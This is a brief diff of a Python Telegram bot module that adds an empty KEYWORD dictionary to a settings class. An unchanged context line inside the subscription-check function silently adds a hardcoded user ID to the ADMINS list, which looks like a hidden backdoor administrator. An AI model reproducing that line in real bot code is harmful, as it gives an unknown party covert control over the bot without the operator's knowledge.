@@ -41,7 +41,8 @@ class temp(object):
     U_NAME = None
     B_NAME = None
     SETTINGS = {}
-
+    KEYWORD = {}
+    
 async def is_subscribed(bot, query):
     
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
